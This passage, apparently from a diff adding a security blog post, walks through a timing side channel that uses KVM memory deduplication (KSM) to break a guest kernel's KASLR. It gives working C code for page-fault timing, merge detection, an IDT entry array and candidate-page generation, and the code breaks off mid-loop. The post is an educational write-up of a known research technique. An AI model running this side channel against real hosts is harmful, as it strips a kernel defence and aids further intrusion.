+    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
+    <span class="k">return</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// allocate a single read/write anon/private page</span>
+<span class="kt">void</span> <span class="o">*</span><span class="nf">alloc_page</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANON</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
+
+    <span class="c1">// demonstrates that faulting accesses have distinct timings</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"fault     : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"post-fault: %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The timer isn’t particularly precise but it doesn’t really need to be because of how long page faults take, here is what I get running this code:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fault     : 7290 cycles
+post-fault: 108 cycles
+</code></pre></div></div>
+
+<p>Notice the first access took way longer, this is because as described previously the page wasn’t actually allocated until I attempted to access it. So when I wrote to it by calling poke a page fault occurred resulting in the kernel allocating memory for the page. Now when the second poke is timed the page is already allocated so the access occurs way faster and without a fault.</p>
+
+<h3 id="timing-un-merging">timing un-merging</h3>
+
+<p>Cool! So now let’s try to replicate this with madvise with MADV_MERGABLE.</p>
+
+<p>Pretty similar same setup besides the madvise and additional writes, just now we let the pages get merged and time the copy-on-write page fault instead of the demand paging page fault.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">...</span>
+<span class="c1">// read a byte from addr</span>
+<span class="kt">void</span> <span class="nf">maccess</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span> <span class="k">volatile</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="c1">// time maccess using the processor timestamp</span>
+<span class="kt">uint64_t</span> <span class="nf">time_access</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
+    <span class="n">maccess</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">end</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
+    <span class="k">return</span> <span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// allocate victim and attacker pages</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">attacker</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
+
+    <span class="c1">// mark both pages as mergable</span>
+    <span class="n">madvise</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MADV_MERGEABLE</span><span class="p">);</span>
+    <span class="n">madvise</span><span class="p">(</span><span class="n">attacker</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MADV_MERGEABLE</span><span class="p">);</span>
+
+    <span class="c1">// write something unique to both pages so they aren't merged with</span>
+    <span class="c1">// other pages, this also faults them to be sure they are allocated</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">victim</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">attacker</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"sleeping to wait for merge...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"finished sleeping... checking access times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"read  : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_access</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>And here is what the output looks like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sleeping to wait for merge...
+finished sleeping... checking access times
+read  : 54 cycles
+write : 96768 cycles
+write : 54 cycles
+</code></pre></div></div>
+
+<p>The initial read is quick, meaning the page is present and hasn’t been swapped out or anything, but then the first write is extremely slow while the second write is quick. This result indicates that a page fault occurred on the first write due to the page having been merged, and the difference in timing for the pagefault was extremely distinct. So that now we know that we can observe memory deduplication let’s look at how to exploit it.</p>
+
+<h2 id="targeting-kvm">targeting KVM</h2>
+
+<p>Kernel Samepage Merging was originally designed with KVM in mind[7]. Though madvise exposes it to any application, KVM is still its main user and if it is enabled on the system qemu will use it by default.</p>
+
+<h3 id="making-sure-ksm-is-enabled-for-kvm">making sure KSM is enabled for KVM</h3>
+
+<p>To check if KSM is enabled on a system check the contents of /sys/kernel/mm/ksm/run, if this is set to ‘1’ then KSM is enabled.</p>
+
+<p>To check if KSM is enabled for qemu using KVM check the contents of /etc/default/qemu-kvm, if this is set to ‘AUTO’ or ‘1’ then memory for qemu VMs that use KVM will be made mergeable.</p>
+
+<h3 id="observing-deduplication-in-kvm">observing deduplication in KVM</h3>
+
+<p>Let’s confirm that deduplication is detectable in KVM with a similar setup. I booted up a Linux VM using qemu-system-x86_64 with ‘–enable-kvm’ and ‘-cpu host’ specified, and ran the following code.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// allocate victim and attacker pages</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">victim</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">attacker</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
+
+<span class="c1">// write something unique to both pages so they aren't merged with</span>
+<span class="c1">// other zero pages, this also faults them to be sure they are allocated</span>
+<span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">victim</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">attacker</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"sleeping to wait for merge...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"finished sleeping... checking access times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// make sure attacker is present and in cache</span>
+    <span class="n">time_access</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"write : %ld cycles</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">attacker</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The only major differences between this test and the previous, aside from being inside a VM, are that the pages are no longer being marked mergeable using madvise, and the timing is wrapped in a loop (because the merging takes a bit longer with the amount of memory a VM uses).</p>
+
+<p>Here is an example of the output from this test:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+sleeping to wait for merge...
+finished sleeping... checking access times
+write : 81 cycles
+write : 81 cycles
+sleeping to wait for merge...
+finished sleeping... checking access times
+write : 55242 cycles
+write : 54 cycles
+...
+</code></pre></div></div>
+
+<p>So without even marking either of these pages as mergeable, we can see that deduplication occurred!</p>
+
+<p>But this isn’t very interesting yet, all we’ve done is show that we can see our own memory get merged together…</p>
+
+<h3 id="breaking-kaslr">breaking KASLR</h3>
+
+<p>So how can we break KASLR using memory deduplication?</p>
+
+<p>The article describing this attack[2] targets relocations, the idea being that a number of instructions have to be adjusted after the kernel is rebased by KASLR, if we can find some code pages with only a few relocations then only the relocated instructions will differ between boot and leaking the relocated instructions will mean breaking KASLR. So if we just mmap a page in userspace with the contents of a kernel code page and bruteforce the relocations until merging occurs, we should have our leak!</p>
+
+<p>Except that sounds kind of annoying, adjusting relocations in C? maybe it isn’t actually <em>that</em> bad but I’d rather not… so I’ll target something else that’s a little more structured instead: the IDT.</p>
+
+<p>The Interrupt Descriptor Table (IDT) is a decent target for this attack because it is full of entries that represent interrupt entry points, the entries only vary per boot by KASLR affecting what address they will point to. This makes the entries relatively easy to generate, I can just boot the VM, dump the IDT to collect the first qword of the each entry, rebase them to according to the lowest possible virtual address for the kernel to be located, and stick them into an array. I’ll include a script I wrote in the repo that makes generating this array easy.</p>
+
+<p>For an IDT with entries that look like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/16gx 0xfffffe0000000000
+0xfffffe0000000000:	0x88808e0000100920	0x00000000ffffffff
+0xfffffe0000000010:	0x88808e0300100c40	0x00000000ffffffff
+0xfffffe0000000020:	0x88808e0200101680	0x00000000ffffffff
+0xfffffe0000000030:	0x8880ee0000100b30	0x00000000ffffffff
+0xfffffe0000000040:	0x8880ee0000100940	0x00000000ffffffff
+0xfffffe0000000050:	0x88808e0000100960	0x00000000ffffffff
+0xfffffe0000000060:	0x88808e0000100b10	0x00000000ffffffff
+0xfffffe0000000070:	0x88808e0000100980	0x00000000ffffffff
+</code></pre></div></div>
+
+<p>I end up with an array that looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="n">entries</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x81208e0000100920</span><span class="p">,</span> <span class="mh">0x81208e0300100c40</span><span class="p">,</span> <span class="mh">0x81208e0200101680</span><span class="p">,</span> <span class="mh">0x8120ee0000100b30</span><span class="p">,</span> <span class="mh">0x8120ee0000100940</span><span class="p">,</span> <span class="mh">0x81208e0000100960</span><span class="p">,</span> <span class="mh">0x81208e0000100b10</span><span class="p">,</span> <span class="mh">0x81208e0000100980</span><span class="p">,</span> <span class="mh">0x81208e0100100ca0</span><span class="p">,</span> <span class="mh">0x81208e00001009a0</span><span class="p">,</span> <span class="mh">0x81208e0000100a20</span><span class="p">,</span> <span class="mh">0x81208e0000100a50</span><span class="p">,</span> <span class="mh">0x81208e0000100a80</span><span class="p">,</span> <span class="mh">0x81208e0000100ab0</span><span class="p">,</span> <span class="mh">0x81208e0000100b70</span><span class="p">,</span> <span class="mh">0x81208e00001009c0</span><span class="p">,</span> <span class="mh">0x81208e00001009e0</span><span class="p">,</span> <span class="mh">0x81208e0000100ae0</span><span class="p">,</span> <span class="mh">0x81208e0400100ba0</span><span class="p">,</span> <span class="mh">0x81208e0000100a00</span><span class="p">,</span> <span class="mh">0x81208e0000100db0</span><span class="p">,</span> <span class="mh">0x82678e000010992d</span><span class="p">,</span> <span class="mh">0x82678e0000109936</span><span class="p">,</span> <span class="mh">0x82678e000010993f</span><span class="p">,</span> <span class="mh">0x82678e0000109948</span><span class="p">,</span> <span class="mh">0x82678e0000109951</span><span class="p">,</span> <span class="mh">0x82678e000010995a</span><span class="p">,</span> <span class="mh">0x82678e0000109963</span><span class="p">,</span> <span class="mh">0x82678e000010996c</span><span class="p">,</span> <span class="mh">0x81208e0500100d00</span><span class="p">,</span> <span class="mh">0x82678e000010997e</span><span class="p">,</span> <span class="mh">0x82678e0000109987</span><span class="p">,</span> <span class="mh">0x81208e0000100f10</span><span class="p">,</span> <span class="mh">0x81208e0000100228</span><span class="p">,</span> <span class="mh">0x81208e0000100230</span><span class="p">,</span> <span class="mh">0x81208e0000100238</span><span class="p">,</span> <span class="mh">0x81208e0000100240</span><span class="p">,</span> <span class="mh">0x81208e0000100248</span><span class="p">,</span> <span class="mh">0x81208e0000100250</span><span class="p">,</span> <span class="mh">0x81208e0000100258</span><span class="p">,</span> <span class="mh">0x81208e0000100260</span><span class="p">,</span> <span class="mh">0x81208e0000100268</span><span class="p">,</span> <span class="mh">0x81208e0000100270</span><span class="p">,</span> <span class="mh">0x81208e0000100278</span><span class="p">,</span> <span class="mh">0x81208e0000100280</span><span class="p">,</span> <span class="mh">0x81208e0000100288</span><span class="p">,</span> <span class="mh">0x81208e0000100290</span><span class="p">,</span> <span class="mh">0x81208e0000100298</span><span class="p">,</span> <span class="mh">0x81208e00001002a0</span><span class="p">,</span> <span class="mh">0x81208e00001002a8</span><span class="p">,</span> <span class="mh">0x81208e00001002b0</span><span class="p">,</span> <span class="mh">0x81208e00001002b8</span><span class="p">,</span> <span class="mh">0x81208e00001002c0</span><span class="p">,</span> <span class="mh">0x81208e00001002c8</span><span class="p">,</span> <span class="mh">0x81208e00001002d0</span><span class="p">,</span> <span class="mh">0x81208e00001002d8</span><span class="p">,</span> <span class="mh">0x81208e00001002e0</span><span class="p">,</span> <span class="mh">0x81208e00001002e8</span><span class="p">,</span> <span class="mh">0x81208e00001002f0</span><span class="p">,</span> <span class="mh">0x81208e00001002f8</span><span class="p">,</span> <span class="mh">0x81208e0000100300</span><span class="p">,</span> <span class="mh">0x81208e0000100308</span><span class="p">,</span> <span class="mh">0x81208e0000100310</span><span class="p">,</span> <span class="mh">0x81208e0000100318</span><span class="p">,</span> <span class="mh">0x81208e0000100320</span><span class="p">,</span> <span class="mh">0x81208e0000100328</span><span class="p">,</span> <span class="mh">0x81208e0000100330</span><span class="p">,</span> <span class="mh">0x81208e0000100338</span><span class="p">,</span> <span class="mh">0x81208e0000100340</span><span class="p">,</span> <span class="mh">0x81208e0000100348</span><span class="p">,</span> <span class="mh">0x81208e0000100350</span><span class="p">,</span> <span class="mh">0x81208e0000100358</span><span class="p">,</span> <span class="mh">0x81208e0000100360</span><span class="p">,</span> <span class="mh">0x81208e0000100368</span><span class="p">,</span> <span class="mh">0x81208e0000100370</span><span class="p">,</span> <span class="mh">0x81208e0000100378</span><span class="p">,</span> <span class="mh">0x81208e0000100380</span><span class="p">,</span> <span class="mh">0x81208e0000100388</span><span class="p">,</span> <span class="mh">0x81208e0000100390</span><span class="p">,</span> <span class="mh">0x81208e0000100398</span><span class="p">,</span> <span class="mh">0x81208e00001003a0</span><span class="p">,</span> <span class="mh">0x81208e00001003a8</span><span class="p">,</span> <span class="mh">0x81208e00001003b0</span><span class="p">,</span> <span class="mh">0x81208e00001003b8</span><span class="p">,</span> <span class="mh">0x81208e00001003c0</span><span class="p">,</span> <span class="mh">0x81208e00001003c8</span><span class="p">,</span> <span class="mh">0x81208e00001003d0</span><span class="p">,</span> <span class="mh">0x81208e00001003d8</span><span class="p">,</span> <span class="mh">0x81208e00001003e0</span><span class="p">,</span> <span class="mh">0x81208e00001003e8</span><span class="p">,</span> <span class="mh">0x81208e00001003f0</span><span class="p">,</span> <span class="mh">0x81208e00001003f8</span><span class="p">,</span> <span class="mh">0x81208e0000100400</span><span class="p">,</span> <span class="mh">0x81208e0000100408</span><span class="p">,</span> <span class="mh">0x81208e0000100410</span><span class="p">,</span> <span class="mh">0x81208e0000100418</span><span class="p">,</span> <span class="mh">0x81208e0000100420</span><span class="p">,</span> <span class="mh">0x81208e0000100428</span><span class="p">,</span> <span class="mh">0x81208e0000100430</span><span class="p">,</span> <span class="mh">0x81208e0000100438</span><span class="p">,</span> <span class="mh">0x81208e0000100440</span><span class="p">,</span> <span class="mh">0x81208e0000100448</span><span class="p">,</span> <span class="mh">0x81208e0000100450</span><span class="p">,</span> <span class="mh">0x81208e0000100458</span><span class="p">,</span> <span class="mh">0x81208e0000100460</span><span class="p">,</span> <span class="mh">0x81208e0000100468</span><span class="p">,</span> <span class="mh">0x81208e0000100470</span><span class="p">,</span> <span class="mh">0x81208e0000100478</span><span class="p">,</span> <span class="mh">0x81208e0000100480</span><span class="p">,</span> <span class="mh">0x81208e0000100488</span><span class="p">,</span> <span class="mh">0x81208e0000100490</span><span class="p">,</span> <span class="mh">0x81208e0000100498</span><span class="p">,</span> <span class="mh">0x81208e00001004a0</span><span class="p">,</span> <span class="mh">0x81208e00001004a8</span><span class="p">,</span> <span class="mh">0x81208e00001004b0</span><span class="p">,</span> <span class="mh">0x81208e00001004b8</span><span class="p">,</span> <span class="mh">0x81208e00001004c0</span><span class="p">,</span> <span class="mh">0x81208e00001004c8</span><span class="p">,</span> <span class="mh">0x81208e00001004d0</span><span class="p">,</span> <span class="mh">0x81208e00001004d8</span><span class="p">,</span> <span class="mh">0x81208e00001004e0</span><span class="p">,</span> <span class="mh">0x81208e00001004e8</span><span class="p">,</span> <span class="mh">0x81208e00001004f0</span><span class="p">,</span> <span class="mh">0x81208e00001004f8</span><span class="p">,</span> <span class="mh">0x81208e0000100500</span><span class="p">,</span> <span class="mh">0x81208e0000100508</span><span class="p">,</span> <span class="mh">0x81208e0000100510</span><span class="p">,</span> <span class="mh">0x81208e0000100518</span><span class="p">,</span> <span class="mh">0x8120ee0000101a80</span><span class="p">,</span> <span class="mh">0x81208e0000100528</span><span class="p">,</span> <span class="mh">0x81208e0000100530</span><span class="p">,</span> <span class="mh">0x81208e0000100538</span><span class="p">,</span> <span class="mh">0x81208e0000100540</span><span class="p">,</span> <span class="mh">0x81208e0000100548</span><span class="p">,</span> <span class="mh">0x81208e0000100550</span><span class="p">,</span> <span class="mh">0x81208e0000100558</span><span class="p">,</span> <span class="mh">0x81208e0000100560</span><span class="p">,</span> <span class="mh">0x81208e0000100568</span><span class="p">,</span> <span class="mh">0x81208e0000100570</span><span class="p">,</span> <span class="mh">0x81208e0000100578</span><span class="p">,</span> <span class="mh">0x81208e0000100580</span><span class="p">,</span> <span class="mh">0x81208e0000100588</span><span class="p">,</span> <span class="mh">0x81208e0000100590</span><span class="p">,</span> <span class="mh">0x81208e0000100598</span><span class="p">,</span> <span class="mh">0x81208e00001005a0</span><span class="p">,</span> <span class="mh">0x81208e00001005a8</span><span class="p">,</span> <span class="mh">0x81208e00001005b0</span><span class="p">,</span> <span class="mh">0x81208e00001005b8</span><span class="p">,</span> <span class="mh">0x81208e00001005c0</span><span class="p">,</span> <span class="mh">0x81208e00001005c8</span><span class="p">,</span> <span class="mh">0x81208e00001005d0</span><span class="p">,</span> <span class="mh">0x81208e00001005d8</span><span class="p">,</span> <span class="mh">0x81208e00001005e0</span><span class="p">,</span> <span class="mh">0x81208e00001005e8</span><span class="p">,</span> <span class="mh">0x81208e00001005f0</span><span class="p">,</span> <span class="mh">0x81208e00001005f8</span><span class="p">,</span> <span class="mh">0x81208e0000100600</span><span class="p">,</span> <span class="mh">0x81208e0000100608</span><span class="p">,</span> <span class="mh">0x81208e0000100610</span><span class="p">,</span> <span class="mh">0x81208e0000100618</span><span class="p">,</span> <span class="mh">0x81208e0000100620</span><span class="p">,</span> <span class="mh">0x81208e0000100628</span><span class="p">,</span> <span class="mh">0x81208e0000100630</span><span class="p">,</span> <span class="mh">0x81208e0000100638</span><span class="p">,</span> <span class="mh">0x81208e0000100640</span><span class="p">,</span> <span class="mh">0x81208e0000100648</span><span class="p">,</span> <span class="mh">0x81208e0000100650</span><span class="p">,</span> <span class="mh">0x81208e0000100658</span><span class="p">,</span> <span class="mh">0x81208e0000100660</span><span class="p">,</span> <span class="mh">0x81208e0000100668</span><span class="p">,</span> <span class="mh">0x81208e0000100670</span><span class="p">,</span> <span class="mh">0x81208e0000100678</span><span class="p">,</span> <span class="mh">0x81208e0000100680</span><span class="p">,</span> <span class="mh">0x81208e0000100688</span><span class="p">,</span> <span class="mh">0x81208e0000100690</span><span class="p">,</span> <span class="mh">0x81208e0000100698</span><span class="p">,</span> <span class="mh">0x81208e00001006a0</span><span class="p">,</span> <span class="mh">0x81208e00001006a8</span><span class="p">,</span> <span class="mh">0x81208e00001006b0</span><span class="p">,</span> <span class="mh">0x81208e00001006b8</span><span class="p">,</span> <span class="mh">0x81208e00001006c0</span><span class="p">,</span> <span class="mh">0x81208e00001006c8</span><span class="p">,</span> <span class="mh">0x81208e00001006d0</span><span class="p">,</span> <span class="mh">0x81208e00001006d8</span><span class="p">,</span> <span class="mh">0x81208e00001006e0</span><span class="p">,</span> <span class="mh">0x81208e00001006e8</span><span class="p">,</span> <span class="mh">0x81208e00001006f0</span><span class="p">,</span> <span class="mh">0x81208e00001006f8</span><span class="p">,</span> <span class="mh">0x81208e0000100700</span><span class="p">,</span> <span class="mh">0x81208e0000100708</span><span class="p">,</span> <span class="mh">0x81208e0000100710</span><span class="p">,</span> <span class="mh">0x81208e0000100718</span><span class="p">,</span> <span class="mh">0x81208e0000100720</span><span class="p">,</span> <span class="mh">0x81208e0000100728</span><span class="p">,</span> <span class="mh">0x81208e0000100730</span><span class="p">,</span> <span class="mh">0x81208e0000100738</span><span class="p">,</span> <span class="mh">0x81208e0000100740</span><span class="p">,</span> <span class="mh">0x81208e0000100748</span><span class="p">,</span> <span class="mh">0x81208e0000100750</span><span class="p">,</span> <span class="mh">0x81208e0000100758</span><span class="p">,</span> <span class="mh">0x81208e0000100760</span><span class="p">,</span> <span class="mh">0x81208e0000100768</span><span class="p">,</span> <span class="mh">0x81208e0000100770</span><span class="p">,</span> <span class="mh">0x81208e0000100778</span><span class="p">,</span> <span class="mh">0x81208e0000100780</span><span class="p">,</span> <span class="mh">0x81208e0000100788</span><span class="p">,</span> <span class="mh">0x81208e0000100790</span><span class="p">,</span> <span class="mh">0x81208e0000100798</span><span class="p">,</span> <span class="mh">0x81208e00001007a0</span><span class="p">,</span> <span class="mh">0x81208e00001007a8</span><span class="p">,</span> <span class="mh">0x81208e00001007b0</span><span class="p">,</span> <span class="mh">0x81208e00001007b8</span><span class="p">,</span> <span class="mh">0x81208e00001007c0</span><span class="p">,</span> <span class="mh">0x81208e00001007c8</span><span class="p">,</span> <span class="mh">0x81208e00001007d0</span><span class="p">,</span> <span class="mh">0x81208e00001007d8</span><span class="p">,</span> <span class="mh">0x81208e00001007e0</span><span class="p">,</span> <span class="mh">0x81208e00001007e8</span><span class="p">,</span> <span class="mh">0x81208e00001007f0</span><span class="p">,</span> <span class="mh">0x81208e00001007f8</span><span class="p">,</span> <span class="mh">0x81208e0000100800</span><span class="p">,</span> <span class="mh">0x81208e0000100808</span><span class="p">,</span> <span class="mh">0x81208e0000100810</span><span class="p">,</span> <span class="mh">0x81208e0000100818</span><span class="p">,</span> <span class="mh">0x81208e0000100820</span><span class="p">,</span> <span class="mh">0x81208e0000100828</span><span class="p">,</span> <span class="mh">0x81208e0000100830</span><span class="p">,</span> <span class="mh">0x81208e0000100838</span><span class="p">,</span> <span class="mh">0x81208e0000100840</span><span class="p">,</span> <span class="mh">0x81208e0000100848</span><span class="p">,</span> <span class="mh">0x81208e0000100850</span><span class="p">,</span> <span class="mh">0x81208e0000100858</span><span class="p">,</span> <span class="mh">0x81208e0000100860</span><span class="p">,</span> <span class="mh">0x81208e0000100868</span><span class="p">,</span> <span class="mh">0x81208e0000100870</span><span class="p">,</span> <span class="mh">0x81208e0000100878</span><span class="p">,</span> <span class="mh">0x81208e0000100eb0</span><span class="p">,</span> <span class="mh">0x81208e0000100888</span><span class="p">,</span> <span class="mh">0x81208e0000100890</span><span class="p">,</span> <span class="mh">0x81208e0000100898</span><span class="p">,</span> <span class="mh">0x81208e0000101050</span><span class="p">,</span> <span class="mh">0x81208e0000101030</span><span class="p">,</span> <span class="mh">0x81208e0000101010</span><span class="p">,</span> <span class="mh">0x81208e0000101110</span><span class="p">,</span> <span class="mh">0x81208e0000100fb0</span><span class="p">,</span> <span class="mh">0x81208e00001008c8</span><span class="p">,</span> <span class="mh">0x81208e0000100ff0</span><span class="p">,</span> <span class="mh">0x81208e0000100ed0</span><span class="p">,</span> <span class="mh">0x81208e0000100f30</span><span class="p">,</span> <span class="mh">0x81208e0000100f90</span><span class="p">,</span> <span class="mh">0x81208e0000100fd0</span><span class="p">,</span> <span class="mh">0x81208e0000100f50</span><span class="p">,</span> <span class="mh">0x81208e0000100f70</span><span class="p">,</span> <span class="mh">0x81208e0000100ef0</span><span class="p">,</span> <span class="mh">0x81208e0000100e70</span><span class="p">,</span> <span class="mh">0x81208e0000100e90</span> <span class="p">};</span></code></pre></figure>
+
+<p>With that array created it is very easy to produce an IDT page for a potential KASLR offset:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">setup_idt_page</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">uint64_t</span> <span class="n">shifted_offset</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">offset</span> <span class="o">&lt;&lt;</span> <span class="mi">53</span><span class="p">;</span>
+        <span class="n">page</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">shifted_offset</span> <span class="o">+</span> <span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="n">page</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">page</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now all that is left is to put it all together and we’ll have constructed an attack that can break KASLR within KVM by exploiting KSM on IDT pages!</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// create candidate IDT pages</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">idt_pages</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="n">idt_pages</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">setup_idt_page</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+
+<span class="c1">// detect if any candidate pages were merged</span>
+<span class="kt">int</span> <span class="n">attempt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"-- beginning attempt %d --</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">++</span><span class="n">attempt</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">results</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
